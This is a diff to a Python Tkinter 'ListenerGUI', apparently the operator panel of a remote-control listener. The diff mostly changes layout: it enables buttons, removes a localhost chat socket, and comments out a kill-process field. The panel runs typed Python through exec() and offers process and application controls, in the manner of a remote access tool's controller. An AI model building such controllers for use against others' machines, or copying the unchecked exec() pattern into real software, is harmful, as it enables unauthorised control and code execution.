@@ -63,21 +63,21 @@ class ListenerGUI:
 		self.link_label.grid(row=9, column=0)
 		self.link_entry = tk.Entry(master)
 		self.link_entry.grid(row=9, column=1)
-		self.link_button = tk.Button(master, text="Open Link", command=self.open_link, state="disabled")
+		self.link_button = tk.Button(master, text="Open Link", command=self.open_link)
 		self.link_button.grid(row=10, column=0, columnspan=2)
-		self.clear_link_button = tk.Button(master, text="Clear Link", command=self.clear_link, state="disabled")
+		self.clear_link_button = tk.Button(master, text="Clear Link", command=self.clear_link)
 		self.clear_link_button.grid(row=10, column=1)
 
-		# Create the kill process entry field and label
-		self.kill_process_label = tk.Label(master, text="Enter process ID to kill:")
-		self.kill_process_label.grid(row=16, column=0)
-		self.kill_process_entry = tk.Entry(master)
-		self.kill_process_entry.grid(row=16, column=1)
+#		# Create the kill process entry field and label
+#		self.kill_process_label = tk.Label(master, text="Enter process ID to kill:")
+#		self.kill_process_label.grid(row=16, column=0)
+#		self.kill_process_entry = tk.Entry(master)
+#		self.kill_process_entry.grid(row=16, column=1)
 
 		# Create the console output
 		self.console = tk.Text(master)
 		self.console.grid(row=17, column=0, columnspan=2)
-		self.clear_console_button = tk.Button(master, text="Clear Console", command=self.clear_console, state="disabled")
+		self.clear_console_button = tk.Button(master, text="Clear Console", command=self.clear_console)
 		self.clear_console_button.grid(row=18, column=2, columnspan=2)
 
 		# Create the message input field and send button
@@ -85,56 +85,18 @@ class ListenerGUI:
 		self.message_label.grid(row=5, column=0)
 		self.entry_message = tk.Entry(master)
 		self.entry_message.grid(row=5, column=1)
-		self.send_message = tk.Button(master, text="Send Message", command=self.send_message, state="disabled")
+		self.send_message = tk.Button(master, text="Send Message", command=self.send_message)
 		self.send_message.grid(row=6, column=0, columnspan=2)
+		self.clear_message_button = tk.Button(master, text="Clear Message", command=self.clear_link)
+		self.clear_message_button.grid(row=6, column=1)
 
 		# Create the message input field and send button
-		self.python_label = tk.Label(master, text="Python:")
+		self.python_label = tk.Label(master, text="Python Code :")
 		self.python_label.grid(row=7, column=0)
 		self.entry_message_1 = tk.Entry(master)
 		self.entry_message_1.grid(row=7, column=1)
-		self.py_send_message = tk.Button(master, text="Run Python", command=self.send_message, state="disabled")
+		self.py_send_message = tk.Button(master, text="Execute Code", command=self.send_message)
 		self.py_send_message.grid(row=8, column=0, columnspan=2)
-
-		# Create entry for application name
-		self.app_name_entry = tk.Entry(master)
-		self.app_name_entry.grid(row=11, column=0, columnspan=2, padx=5, pady=5, sticky='we')
-
-		# Create radio button group for application actions
-		self.app_action = tk.StringVar()
-		self.app_action.set("start") # Default action
-
-		self.start_app_radio = tk.Radiobutton(master, text="Start", variable=self.app_action, value="start", state="disabled")
-		self.start_app_radio.grid(row=11, column=2, padx=5, pady=5, sticky='w')
-
-		self.stop_app_radio = tk.Radiobutton(master, text="Stop", variable=self.app_action, value="stop", state="disabled")
-		self.stop_app_radio.grid(row=12, column=2, padx=5, pady=5, sticky='w')
-
-		# Create buttons for application control
-		self.start_app_button = tk.Button(master, text="Start Application", command=self.app_control, state="disabled")
-		self.start_app_button.grid(row=11, column=3, padx=5, pady=5, sticky='we')
-
-		self.stop_app_button = tk.Button(master, text="Stop Application", command=self.app_control, state="disabled")
-		self.stop_app_button.grid(row=12, column=3, padx=5, pady=5, sticky='we')
-
-		# Create a chat msg group
-		self.chat_label = tk.Label(master, text="Chat: ")
-		self.chat_label.grid(row=13, column=0)
-		self.chat_entry = tk.Entry(master)
-		self.command_entry.grid(row=13, column=1)
-		self.execute_button = tk.Button(master, text="Send", command=self.send_chat, state="disabled")
-		self.execute_button.grid(row=14, column=0, columnspan=2)
-
-		# Create a text area for chat history
-		self.chat_history = tk.Text(master, height=10, width=50)
-		self.chat_history.grid(row=15, column=0, columnspan=3)
-
-		# Start a new thread to listen for chat messages from the client
-		self.chat_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		self.chat_socket.bind(('localhost', 9090))
-		self.chat_socket.listen(1)
-
-		threading.Thread(target=self.listen_for_chat_messages).start()
 
 		# Set up event listener for the message input field
 		self.entry_message.bind("<KeyRelease>", self.check_message_entry)
@@ -242,7 +204,7 @@ class ListenerGUI:
 			exec(code)
 		except Exception as e:
 			messagebox.showerror("Error", e)
-			
+
 	def start_listener(self):
 		# Get the host and port from the input fields
 		host = self.host_entry.get()
@@ -335,8 +297,6 @@ class ListenerGUI:
 
 	def list_executables(self):
 		# Get a list of files in the current directory
-#		desktop_path = os.path.join(os.environ["USERPROFILE"], "Desktop")
-#		files = os.listdir(desktop_path)
 		files = os.listdir()
 
 		# Filter out the executable files
@@ -469,4 +429,3 @@ if __name__ == '__main__':
 	root = tk.Tk()
 	gui = ListenerGUI(root)
 	root.mainloop()
-
